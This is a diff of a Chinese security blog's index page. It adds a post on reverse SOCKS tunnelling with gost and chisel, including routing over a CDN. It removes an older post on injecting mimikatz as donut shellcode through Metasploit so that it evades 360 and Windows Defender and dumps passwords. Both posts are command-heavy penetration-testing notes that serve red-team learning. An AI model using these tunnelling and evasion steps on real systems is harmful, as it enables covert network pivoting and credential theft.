@@ -261,6 +261,244 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2022/03/17/Socks代理进阶篇/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="scareing">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/Bloglogo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="scareing的学习笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2022/03/17/Socks代理进阶篇/" itemprop="url">Socks代理进阶篇</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-03-17T12:12:57+08:00">
+                2022-03-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/内网/" itemprop="url" rel="index">
+                    <span itemprop="name">内网</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Socks代理进阶篇"><a href="#Socks代理进阶篇" class="headerlink" title="Socks代理进阶篇"></a>Socks代理进阶篇</h1><h2 id="Gost"><a href="#Gost" class="headerlink" title="Gost"></a>Gost</h2><p><strong>特点：支持多级转发，支持多种代理协议和隧道类型，</strong></p>
+<p>链接：<a href="https://github.com/ginuerzh/gost">https://github.com/ginuerzh/gost</a></p>
+<ul>
+<li>普通socks5</li>
+</ul>
+<p>服务端 </p>
+<blockquote>
+<p>​      ./gost-linux-amd64-2.11.1 -L quic://:3333</p>
+</blockquote>
+<p>客户端</p>
+<blockquote>
+<p>​      ./gost -L :9997</p>
+</blockquote>
+<blockquote>
+<p>​      ./gost -L rtcp://0.0.0.0:9997/localhost:9997 -F “quic://8.8.8.8:3333?mbind=true”</p>
+</blockquote>
+<ul>
+<li>socks+tls over quic by tcp</li>
+</ul>
+<p>服务端</p>
+<blockquote>
+<p>​    ./gost-linux-amd64-2.11.1 -L quic://:3333</p>
+</blockquote>
+<blockquote>
+<p>​    ./gost-linux-amd64-2.11.1 -L=socks://0.0.0.0:9997 -F socks5+tls://:9998</p>
+</blockquote>
+<p>客户端</p>
+<blockquote>
+<p>​    ./gost -L socks5+tls://:9998</p>
+</blockquote>
+<blockquote>
+<p>​    ./gost -L rtcp://0.0.0.0:9998/localhost:9998 -F “quic://8.8.8.8:3333?mbind=true”</p>
+</blockquote>
+<blockquote>
+<p>​    curl –socks5 106.75.67.182:9997 ip.sb</p>
+</blockquote>
+<ul>
+<li>socks+quic over quic by udp</li>
+</ul>
+<p>服务端</p>
+<blockquote>
+<p>​     ./gost-linux-amd64-2.11.1 -L quic://:3333</p>
+</blockquote>
+<blockquote>
+<p>​     ./gost-linux-amd64-2.11.1 -L=socks://0.0.0.0:9997 -F socks5+quic://:9998</p>
+</blockquote>
+<p>客户端</p>
+<blockquote>
+<p>​    ./gost -L socks5+quic://:9998</p>
+</blockquote>
+<blockquote>
+<p>​    ./gost -L rudp://0.0.0.0:9998/localhost:9998 -F “quic://8.8.8.8:3333?mbind=true?ping=60”</p>
+</blockquote>
+<blockquote>
+<p>​    socks5://admin:password@:9998</p>
+</blockquote>
+<ul>
+<li>http2代理模式</li>
+</ul>
+<p>服务端</p>
+<blockquote>
+<p>​     gost  -L socks5+h2://:8443</p>
+</blockquote>
+<p>客户端</p>
+<blockquote>
+<p>​    gost -L socks5://127.0.0.1:10002</p>
+</blockquote>
+<blockquote>
+<p>​    gost  -L rtcp://0.0.0.0:10002/localhost:10002 -F “socks5+h2://8.8.8.8:8443?mbind=true”</p>
+</blockquote>
+<h2 id="chisel"><a href="#chisel" class="headerlink" title="chisel"></a>chisel</h2><p><strong>特点：基于ssh协议的加密链接，支持tcp\udp传输，使用websocket传输可走CDN和云函数</strong></p>
+<p>链接：<a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a></p>
+<ul>
+<li>cdn+http</li>
+</ul>
+<p>服务端</p>
+<blockquote>
+<p>​    ./chisel server –reverse</p>
+</blockquote>
+<p>客户端</p>
+<blockquote>
+<p>​    chisel.exe client cdndomain:8080 R:0.0.0.0:1080:socks</p>
+</blockquote>
+<ul>
+<li>cdn+https</li>
+</ul>
+<p>服务端</p>
+<blockquote>
+<p>​    chisel server -p 8443 –reverse –tls-domain domain.com</p>
+</blockquote>
+<p>客户端</p>
+<blockquote>
+<p>​    chisel.exe client <a href="https://cdndomain:8443" target="_blank" rel="noopener">https://cdndomain:8443</a> R:0.0.0.0:1080:socks</p>
+</blockquote>
+
+          
+        
+      
+    </div>
+    
+    
+    
+    <div>
+          
+    </div>
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2022/03/13/互联网隐私保护指南/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2077,171 +2315,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2020/01/26/利用进程注入实现mimikatz免杀执行/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="scareing">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/Bloglogo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="scareing的学习笔记">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/01/26/利用进程注入实现mimikatz免杀执行/" itemprop="url">利用进程注入实现mimikatz免杀执行</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-26T12:12:57+08:00">
-                2020-01-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/bypass/" itemprop="url" rel="index">
-                    <span itemprop="name">bypass</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="利用进程注入实现mimikatz免杀执行"><a href="#利用进程注入实现mimikatz免杀执行" class="headerlink" title="利用进程注入实现mimikatz免杀执行"></a>利用进程注入实现mimikatz免杀执行</h1><blockquote>
-<p>提供一种思路实现渗透工具在渗透过程中的灵活运用，本次测试全程杀软未报毒。</p>
-<p>环境：360+Windows defender</p>
-</blockquote>
-<p>工具</p>
-<p><a href="https://github.com/TheWover/donut">https://github.com/TheWover/donut</a></p>
-<p>metasploit</p>
-<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>将mimikatz转化为二进制文件.</p>
-<p><code>./donut  -f mimikatz.exe  -o mimikatz.bin</code></p>
-<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2020/01/26/%E5%88%A9%E7%94%A8%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E5%AE%9E%E7%8E%B0mimikatz%E5%85%8D%E6%9D%80%E6%89%A7%E8%A1%8C/1.png" alt="avatar"></p>
-<p>已经获取到一个session，这是前提条件嗷</p>
-<p><code>use post/windows/manage/shellcode_inject</code></p>
-<p><code>set SHELLCODE /root/Github/Bypass/donut/mimikatz.bin</code></p>
-<p><code>set CHANNELIZED true</code></p>
-<p><code>set INTERACTIVE true</code></p>
-<p><code>set HIDDEN true</code></p>
-<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2020/01/26/%E5%88%A9%E7%94%A8%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E5%AE%9E%E7%8E%B0mimikatz%E5%85%8D%E6%9D%80%E6%89%A7%E8%A1%8C/2.png" alt="avatar"></p>
-<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>mimikatz需要admin权限才能抓密码。</p>
-<p>x86的程序只能插入到x86的进程中，x64同理</p>
-<p>inject的各个选项极其重要，注意灵活调整。</p>
-<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2020/01/26/%E5%88%A9%E7%94%A8%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E5%AE%9E%E7%8E%B0mimikatz%E5%85%8D%E6%9D%80%E6%89%A7%E8%A1%8C/1.jpg" alt="avatar"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-    <div>
-          
-    </div>
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2294,7 +2367,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">28</span>
+                  <span class="site-state-item-count">29</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2316,7 +2389,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-count">20</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
